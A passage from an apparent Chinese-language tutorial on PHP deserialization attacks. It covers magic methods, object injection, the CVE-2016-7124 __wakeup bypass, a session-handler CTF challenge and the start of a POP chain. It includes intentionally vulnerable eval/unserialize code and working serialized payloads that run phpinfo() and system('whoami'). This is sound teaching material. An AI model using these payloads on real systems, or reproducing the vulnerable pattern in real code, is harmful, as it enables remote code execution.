punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:1:"A":2:{s:4:"name";s:7:"fanxing";s:3:"age";s:2:"20";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>打印出Skill方法中的值</p><p><code>My name is fanxing,I am is 20 years old!</code></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象销毁调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象字符串调用"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象以函数调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"序列化被调用&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"反序列化被调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里我们打印下序列化结果，发现属性的长度是7。</p><pre><code>O:1:&quot;A&quot;:1:{s:7:&quot;Aname&quot;;N;}</code></pre><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><pre><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</code></pre><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><pre><code>O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><pre><code>PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10</code></pre><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><pre><code>O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</code></pre><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'fanxing'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当session.serialize_handler为php的时候，存储的session结果为</p><pre><code>name|s:7:&quot;fanxing&quot;;</code></pre><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><pre><code>a:1:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;}</code></pre><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><pre><code>二进制字符串names:7:&quot;fanxing&quot;</code></pre><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><pre><code>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</code></pre><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'sessiontest.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="<span class="token prolog">&lt;?php echo ini_get("session.upload_progress.name"); ?></span>" value="123" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string">'print_r(dirname(__FILE__));'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$repl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token variable">$repl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">,</span> <span class="token variable">$endl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$format</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里装入LogWriter_File对象</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$writer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这里偷梁换柱Song的log</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Song</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$group</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$group</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token operator">=</span> <span class="token variable">$group</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$fltr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token string">"/\[i\](.*)\[\/i\]/i"</span><span class="token punctuation">,</span> <span class="token string">"&lt;i>\\1&lt;/i>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">"song_views"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$fltr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;a href='"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>url <span class="token punctuation">.</span> <span class="token string">"'>&lt;i>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/i>&lt;/a> by "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token 